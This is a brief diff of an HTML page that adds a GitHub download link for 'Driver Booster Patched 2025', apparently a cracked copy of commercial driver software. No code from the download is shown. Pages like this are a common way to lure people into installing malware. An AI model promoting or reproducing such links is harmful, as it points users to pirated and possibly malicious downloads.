@@ -7,7 +7,7 @@
 
 
   
-  <h2><a href="">🟩 Download Driver Booster Patched 2025  🟩</a></h2>
+  <h2><a href="https://github.com/888elite/IOBit-Driver-Booster-2025/releases/download/patche_latest/DriverBooster_2025.zip">🟩 Download Driver Booster Patched 2025  🟩</a></h2>
 </div>
 
 
